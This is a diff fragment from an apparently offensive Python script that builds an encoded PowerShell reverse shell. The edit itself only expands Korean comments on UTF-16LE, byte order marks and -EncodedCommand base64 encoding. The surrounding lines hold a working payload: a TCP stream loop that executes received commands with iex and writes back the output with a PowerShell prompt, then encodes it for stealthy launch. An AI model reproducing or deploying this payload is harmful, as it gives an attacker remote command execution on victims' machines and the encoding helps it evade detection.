@@ -36,9 +36,9 @@ psh_shell = (
     + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 =$sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 )
 
-# PowerShell -EncodedCommand는 UTF-16LE(base64) 입력을 기대함
-# encode("utf-16") → BOM(2바이트) + UTF-16 데이터 생성
-# [2:] → BOM 제거 (PowerShell은 BOM 없는 UTF-16LE를 원함)
+# PowerShell -EncodedCommand는 UTF-16LE(UTF-16 Little Endian, base64) 입력을 기대함
+# encode("utf-16") → BOM(Byte Order Mark, 2바이트) + UTF-16 데이터 생성
+# [2:] → BOM(Byte Order Mark) 제거 (PowerShell은 BOM 없는 UTF-16LE(UTF-16 Little Endian)를 원함)
 psh_shell = psh_shell.encode("utf-16")[2:]
 
 # base64 인코딩 (PowerShell -EncodedCommand 형식)
